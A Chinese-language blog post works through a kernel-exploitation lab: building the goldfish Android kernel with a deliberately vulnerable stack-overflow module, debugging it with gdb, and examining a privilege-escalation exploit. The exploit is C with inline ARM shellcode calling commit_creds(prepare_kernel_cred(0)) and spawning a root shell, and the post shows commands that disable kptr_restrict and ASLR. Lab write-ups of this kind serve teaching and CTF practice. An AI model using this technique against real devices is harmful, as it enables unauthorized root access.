---
title: Kernel pwn 初探
date: 2019-01-21 21:18:55
tags: pwn
top_img: 
---

这次 XMAN 冬令营讲了很多有意思的东西，需要很长的时间来消化吸收。我先写一下这几天看的一个简单 pwn 入门吧。

<!--more-->

# 前言

这篇文章主要研究了 [AndroidKernelExploitationPlayground](https://github.com/Fuzion24/AndroidKernelExploitationPlayground) 这个项目。最开始按照他的 exp 跑没有完全跑通，当然了，Android 发展这么快出现各种意外这也是很正常的。这次（2019 年1月）我尝试着在当前环境下搭环境并测试 `challenges/stack_buffer_overflow` 这个样例。

## 环境搭建

搭建平台：Ubuntu 16.04

目录树如下：

```
playground
├── android-sdk-linux
├── arm-linux-androideabi-4.6
├── goldfish
└── kernel_exploit_challenges
```

内核代码下载：

```bash
git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git
```

clone 项目：

```bash
git clone https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git kernel_exploit_challenges
```

进入 `goldfish` 目录，将 branch 切换到 3.4：

```bash
cd goldfish && git checkout -t origin/android-goldfish-3.4
```

`git am` 可以将 patch 应用到当前的内核，`--signoff` 意味着使用自己的提交者标识向提交消息添加 `Signed-off-by:` 一行。这里应该是修改了内核编译配置，把项目中带漏洞中的模块编译进内核。

```bash
git am --signoff < ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch && \
cd .. && ln -s $(pwd)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities
```

接下来下载 arm-linux-androideabi-4.6 交叉编译工具链，解压后添加到环境变量中（推荐加入到 `.bashrc` 中）。

```bash
git clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6
tar xvf arm-linux-androideabi-4.6.tar.bz2
export PATH=YOURPATH/arm-linux-androideabi-4.6/bin/:$PATH
```

然后开始编译内核：

```bash
export ARCH=arm SUBARCH=arm CROSS_COMPILE=arm-linux-androideabi- &&\
export PATH=$(pwd)/arm-linux-androideabi-4.6/bin/:$PATH && \
cd goldfish && make goldfish_armv7_defconfig && make -j8
```

> 编译完成后，就会有两个主要的文件：`goldfish/vmlinux` 和 `goldfish/arch/arm/boot/zImage`。前面那个用于在调试时 `gdb`加载，后面的用于在安卓模拟器启动时加载。

`vmlinux` 用于提供符号表，`zImage` 则用于运行环境。

接下来下载安卓 SDK。（其实这里最好应该自己编译，SDK 的模拟器功能太少了，有的功能也不是我们想要的）下载完成后解压并将 `android-sdk-linux/tools` 加入环境变量（`.bashrc`）

```bash
wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz
tar xvf android-sdk_r24.4.1-linux.tgz
export PATH=YOURPATH/android-sdk-linux/tools:$PATH
```

别忘了下载 jdk，我直接用的 apt 源：

```bash
sudo apt update
sudo apt-get install default-jre default-jdk
```

接下来在终端中输入 `android` ，下载我们需要的 SDK 和系统镜像：

![](https://ws1.sinaimg.cn/large/79b6884ely1fzel92eejgj20vi0gw77b.jpg)

接下来创建模拟器：

```bash
android create avd --force -t "android-19" -n kernel_challenges
```

接下来进入 goldfish 目录，执行下面的命令用我们的内核运行模拟器，并在 1234 端口 起一个 gdbserver 方便内核调试。

```bash
emulator -show-kernel -kernel arch/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s
```

再开一个 shell，进入 goldfish 目录，加载 vmlinux 以便调试内核：

```bash
arm-linux-androideabi-gdb vmlinux
```

可能会出现这个问题：

```
arm-linux-androideabi-gdb: error while loading shared libraries: libpython2.6.so.1.0: cannot open shared object file: No such file or directory
```

解决方法：

```bash
ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so /usr/lib/x86_64-linux-gnu/libpython2.6.so.1.0
```

当然还可能会有报错。。ldd 一下发现他是从 `/lib/x86_64-linux-gnu` 找的 so 文件。所以可以这样改：

```bash
ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so /lib/x86_64-linux-gnu/libpython2.6.so.1.0
```

一般来讲这样就解决了。

一切正常的话应该会输出如下：

> ```
> GNU gdb (GDB) 7.3.1-gg2
> Copyright (C) 2011 Free Software Foundation, Inc.
> License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
> This is free software: you are free to change and redistribute it.
> There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
> and "show warranty" for details.
> This GDB was configured as "--host=x86_64-apple-darwin --target=arm-linux-android".
> For bug reporting instructions, please see:
> <http://www.gnu.org/software/gdb/bugs/>...
> Reading symbols from <REDACTED>/goldfish/vmlinux...done.
> (gdb)
> ```

当然因为我之前装过了 pwndbg，这里会有一些报错，在此我略过不表。

然后连接模拟器里的调试端口：

```
(gdb) target remote :1234
```

会进入到一个函数中，不管他，我们 continue 就好啦，想下断点的时候就来一个 `Ctrl+C`。虽然学长的博客中说看到这样的输出：

> ```
> Remote debugging using :1234
> cpu_v7_do_idle () at arch/arm/mm/proc-v7.S:74
> 74movpc, lr
> (gdb)
> ```

就可以正常调试了，但我没有和他这个完全一样，也是可以的。

最后的最后，我们还要安装 adb-tools：

```bash
sudo apt update
sudo apt install android-tools-adb
```

终于，漫长的环境搭建结束了。。。

# 内核栈溢出

## 代码分析

看漏洞代码，这一次我看的代码位于 `kernel_exploit_challenges/challenges/stack_buffer_overflow/module/stack_buffer_overflow.c`。

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <asm/uaccess.h>
#define MAX_LENGTH 64
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ryan Welton");
MODULE_DESCRIPTION("Stack Buffer Overflow Example");
static struct proc_dir_entry *stack_buffer_proc_entry;
int proc_entry_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
{
    char buf[MAX_LENGTH];
    if (copy_from_user(&buf, ubuf, count)) {
        printk(KERN_INFO "stackBufferProcEntry: error copying data from userspace\n");
        return -EFAULT;
    }
    return count;
}
static int __init stack_buffer_proc_init(void)
{
    stack_buffer_proc_entry = create_proc_entry("stack_buffer_overflow", 0666, NULL);
    stack_buffer_proc_entry->write_proc = proc_entry_write;
    printk(KERN_INFO "created /proc/stack_buffer_overflow\n");
    return 0;
}
static void __exit stack_buffer_proc_exit(void)
{
    if (stack_buffer_proc_entry) {
        remove_proc_entry("stack_buffer_overflow", stack_buffer_proc_entry);
    }
    printk(KERN_INFO "vuln_stack_proc_entry removed\n");
}
module_init(stack_buffer_proc_init);
module_exit(stack_buffer_proc_exit);
```

> 上述代码会创建 `/proc/stack_buffer_overflow` 设备文件 ，当向该设备文件调用 `write` 系统调用时会调用 `proc_entry_write`函数进行处理。

在这里我们需要了解系统调用的基础知识，在向 `stack_buffer_overflow` 写入时，相关的数据并不会直接写入设备中，而是经过类似于驱动程序的东西，在内核空间中执行。而内核 pwn 就是根据这一点在内核中提权拿 shell。

> 漏洞显而易见，在 `proc_entry_write` 函数中 定义了一个 `64` 字节大小的栈缓冲区`buf`， 然后使用 `copy_from_user(&buf, ubuf, count)` 从用户空间 拷贝数据到 `buf`,数据大小和内容均用户可控。于是当我们输入超过`64`字节时我们能够覆盖其他的数据，比如返回地址等，进而劫持程序执行流到我们的 `shellcode` 中 进行提权。

## 漏洞触发

我们可以通过如下方式触发漏洞。

开启模拟器，`adb shell` 进入模拟器，用 `echo` 命令向 `/proc/stack_buffer_overflow` 设备输入大于等于 72 字节的数据（为什么是 72 字节呢？）：

```bash
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >  /proc/stack_buffer_overflow
```

![](https://ws1.sinaimg.cn/large/79b6884ely1fzem66ed9hj212o0ipjxu.jpg)

学长博客里写的是 PC 寄存器的值为 0x41414141 成功劫持，但是我实际测试的时候可以看出并没有体现这一点。不过终究是触发了 panic，说明我们的输入是有效的。测试的时候没开 pxn（这个地方我纠结了好久，怎样看 pxn 是否开启呢？），所以我们可以在用户态编写 shellcode 让内核去执行。

## 漏洞利用

> 提取的方式很简单，内核态调用  `commit_creds(prepare_kernel_cred(0));` 提升权限为 root，然后返回 用户态执行 `execl("/system/bin/sh", "sh", NULL);` 起一个 `root` 权限的 `shell`， 完成提权。

这里有几个需要注意的细节。在内核中想要获取 root 权限不能只用 `system("/bin/sh");`，而是应该用：

```c
commit_creds(prepare_kernel_cred (0));
```

这个函数分配并应用了一个新的凭证结构（uid = 0, gid = 0）从而获取root权限。也就是说，我们栈溢出的执行流权限并不是很高，但是在内核中我们可以通过执行上述代码来提权，而用户空间则不能执行这条指令。

> 下面先获取 `prepare_kernel_cred` 和 `commit_creds` 函数的地址。在 `/proc/kallsyms` 文件中保存着所有的内核符号的名称和它在内存中的位置。
>
> 不过在最近的内核版本中，为了使利用内核漏洞变得更加困难，`linux` 内核目前禁止一般用户获取符号。具体可以看这里。
>
> 当启用 `kptr_restrict` 时我们是不能获取内核符号地址的。
>
> ```bash
> root@generic:/ # cat /proc/kallsyms | grep commit_creds               >    
> 00000000 T commit_creds
> ```
> 在本文中，把它禁用掉，不管他。
>
> ```bash
> root@generic:/ # echo 0 > /proc/sys/kernel/kptr_restrict               > 
> root@generic:/ # cat /proc/kallsyms | grep commit_creds               >
> c0039834 T commit_creds
> root@generic:/ # cat /proc/kallsyms | grep prepare_kernel_cred                 
> c0039d34 T prepare_kernel_cred
> ```
> 禁用掉之后，我们就可以通过 `/proc/kallsyms` 获取 `commit_creds` 和 `prepare_kernel_cred`的地址。
>
> 至此，提权的问题解决了，下面就是要回到用户态，在`x86`平台有 `iret`指令可以回到用户态，在`arm`下返回用户态就更简单了。在`arm`下 `cpsr` 寄存器的 `M[4：0]` 位用来表示 处理器的运行模式，具体可以看[这个](http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html)。
>
> 所以我们把 `cpsr` 寄存器的 `M[4：0]` 位设置为 `10000` 后就表示 处理器进入了用户模式。
>
> 所以现在的利用思路是：
>
> - 调用 `commit_creds(prepare_kernel_cred(0))` 提升权限
> - 调用 `mov r3, #0x40000010; MSR CPSR_c,R3;`设置 `cpsr`寄存器，使`cpu`进入用户模式
> - 然后执行 `execl("/system/bin/sh", "sh", NULL);` 起一个 `root` 权限的 `shell`

接下来学长给出了他的 exp，但是学长的 exp 在我的设备跑不起来，这当然有环境不同的原因，我们可以看一下他的 exp：

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#define MAX 64
int open_file(void)
{
    int fd = open("/proc/stack_buffer_overflow", O_RDWR);
    if (fd == -1)
        err(1, "open");
    return fd;
}
void payload(void)
{
    printf("[+] enjoy the shell\n");
    execl("/system/bin/sh", "sh", NULL);
}
extern uint32_t shellCode[];
asm(
    "    .text\n"
    "    .align 2\n"
    "    .code 32\n"
    "    .globl shellCode\n\t"
    "shellCode:\n\t"
    // commit_creds(prepare_kernel_cred(0));
    // -> get root
    "LDR     R3, =0xc0039d34\n\t" //prepare_kernel_cred addr
    "MOV     R0, #0\n\t"
    "BLX     R3\n\t"
    "LDR     R3, =0xc0039834\n\t" //commit_creds addr
    "BLX     R3\n\t"
    "mov r3, #0x40000010\n\t"
    "MSR    CPSR_c,R3\n\t"
    "LDR     R3, =0x879c\n\t" // payload function addr
    "BLX     R3\n\t");
void trigger_vuln(int fd)
{
#define MAX_PAYLOAD (MAX + 2 * sizeof(void *))
    char buf[MAX_PAYLOAD];
    memset(buf, 'A', sizeof(buf));
    void *pc = buf + MAX + 1 * sizeof(void *);
    printf("shellcdoe addr: %p\n", shellCode);
    printf("payload:%p\n", payload);
    *(void **)pc = (void *)shellCode; //ret addr
    /* Kaboom! */
    write(fd, buf, sizeof(buf));
}
int main(void)
{
    int fd;
    fd = open_file();
    trigger_vuln(fd);
    payload();
    close(fd);
}
```

### 第一处问题

为什么跑不起来呢？我们可以先分析一下 shellcode：

```c
asm(
    "    .text\n"
    "    .align 2\n"
    "    .code 32\n"
    "    .globl shellCode\n\t"
    "shellCode:\n\t"
    // commit_creds(prepare_kernel_cred(0));
    // -> get root
    "LDR     R3, =0xc0039d34\n\t" //prepare_kernel_cred addr
    "MOV     R0, #0\n\t"
    "BLX     R3\n\t"
    "LDR     R3, =0xc0039834\n\t" //commit_creds addr
    "BLX     R3\n\t"
    "mov r3, #0x40000010\n\t"
    "MSR    CPSR_c,R3\n\t"
    "LDR     R3, =0x879c\n\t" // payload function addr
    "BLX     R3\n\t");
```

shellcode 是内联汇编

> - 调用 `commit_creds(prepare_kernel_cred(0))` 提升权限
> - 调用 `mov r3, #0x40000010; MSR CPSR_c,R3;`设置 `cpsr`寄存器，使`cpu`进入用户模式

这两个思路已经很明确了，地址由于是固定的，所以只需要查询一次就可以写进汇编了。那最后两行是什么意思呢？根据注释我们可以推测最后会进入 `payload` 函数，执行 `execl` 拿到 shell。但是这里 `payload` 的地址为什么就一定是 `0x879c` 呢？在当时的环境下可能是这个值，而现在则很有可能变化。实际上，本环境开启了 ASLR：

![](https://ws1.sinaimg.cn/large/79b6884ely1fzemxkdclvj20ef014jra.jpg)

我们通过以下指令关闭：

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

这样的话每次 `payload` 的位置就固定了。我们就可以将此时的 `payload` 函数位置“硬编码”进汇编中。

### 第二处问题

然而，这其实只是解决了第一处问题。。还有一处问题，出现在哪里呢？请容我细细道来。

由于我们已经开启了 gdb，其实是可以调试的。vmlinux 提供了符号表，而会被利用的函数也知道了是 `proc_entry_write` 这个函数，因此我们就可以在这里下断点：

```
(gdb) b proc_entry_write
Breakpoint 1 at 0xc025c2cc: file drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/module/stack_buffer_overflow.c, line 17.
```

我们还可以看看这个函数的汇编代码：

```
(gdb) disassemble proc_entry_write
Dump of assembler code for function proc_entry_write:
   0xc025c2cc <+0>:		push	{r4, r5, lr}
   0xc025c2d0 <+4>:		sub	sp, sp, #68	; 0x44
   0xc025c2d4 <+8>:		ldr	r0, [pc, #120]	; 0xc025c354
   0xc025c2d8 <+12>:	mov	r4, r2
   0xc025c2dc <+16>:	mov	r5, r1
   0xc025c2e0 <+20>:	bl	0xc0362f78 <printk>
   0xc025c2e4 <+24>:	mov	r2, sp
   0xc025c2e8 <+28>:	bic	r3, r2, #8128	; 0x1fc0
   0xc025c2ec <+32>:	bic	r3, r3, #63	; 0x3f
   0xc025c2f0 <+36>:	ldr	r3, [r3, #8]
   0xc025c2f4 <+40>:	adds	r2, r5, r4
   0xc025c2f8 <+44>:	sbcscc	r2, r2, r3
   0xc025c2fc <+48>:	movcc	r3, #0
   0xc025c300 <+52>:	cmp	r3, #0
   0xc025c304 <+56>:	bne	0xc025c324 <proc_entry_write+88>
   0xc025c308 <+60>:	mov	r0, sp
   0xc025c30c <+64>:	mov	r1, r5
   0xc025c310 <+68>:	mov	r2, r4
   0xc025c314 <+72>:	bl	0xc01cb88c <__copy_from_user>
   0xc025c318 <+76>:	cmp	r0, #0
   0xc025c31c <+80>:	beq	0xc025c348 <proc_entry_write+124>
   0xc025c320 <+84>:	b	0xc025c338 <proc_entry_write+108>
   0xc025c324 <+88>:	cmp	r4, #0
   0xc025c328 <+92>:	beq	0xc025c348 <proc_entry_write+124>
   0xc025c32c <+96>:	mov	r0, sp
   0xc025c330 <+100>:	mov	r1, r4
   0xc025c334 <+104>:	bl	0xc01ccd80 <__memzero>
   0xc025c338 <+108>:	ldr	r0, [pc, #24]	; 0xc025c358
   0xc025c33c <+112>:	bl	0xc0362f78 <printk>
   0xc025c340 <+116>:	mvn	r0, #13
   0xc025c344 <+120>:	b	0xc025c34c <proc_entry_write+128>
   0xc025c348 <+124>:	mov	r0, r4
   0xc025c34c <+128>:	add	sp, sp, #68	; 0x44
   0xc025c350 <+132>:	pop	{r4, r5, pc}
   0xc025c354 <+136>:	subgt	lr, r1, r5, lsr #1
   0xc025c358 <+140>:	subgt	lr, r1, r2, asr #1
End of assembler dump.
```

在这里我们能看到，最开始的时候 push 了三个寄存器：r4、r5、lr。我们要覆盖的这个寄存器，就是返回地址 lr。这里的汇编代码是这样的：

```assembly
push	{r4, r5, lr}
```

那压栈顺序是什么样的？？

最开始的时候我以为是从左向右，直到我几次 exp 都挂掉之后才去网上查了一下，是从右向左。。因此我们封盖的地址应该是 68+4*3 大小才能覆盖到 lr 上。而上面的 exp 只覆盖到了 68+4。。在这里我刚开始卡了好久，看内核输出根本看不懂，直到我意识到还可以调试。。

### 我的解法

之前以为打包好的虚拟机环境不会有地址上的改变，结果我配好的环境到了别人那里居然和 payload 差不多。。我的妈呀，哭了哭了，这是我出题出的最菜的一次，下一次绝对不会这么简单了，哼~

在我这里环境发生了变化。但其实要改的位置也不多，也就上述压栈的大小和那一处地址需要改变。具体的。。只要学过一点 pwn 就一定会写的，我就不写了。。

# XMAN 冬令营总结

这一次比赛是以这道题作为出题点的。我们环境没有配置好导致必须要提供虚拟机。其实这就是一道披着 Android 外衣的纯内核题，我们完全可以自己编译提供文件系统再开放端口的。没有这么做导致我们不得不来回拷贝虚拟机。下一次可以尝试写成 docker 镜像。

# 参考资料

[Fuzion24/AndroidKernelExploitationPlayground](https://github.com/Fuzion24/AndroidKernelExploitationPlayground/tree/master/challenges)

[Android内核漏洞利用技术实战：环境搭建&栈溢出实战](https://www.cnblogs.com/hac425/p/9416962.html)

[入门学习linux内核提权](https://xz.aliyun.com/t/2054)

[基础知识](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/)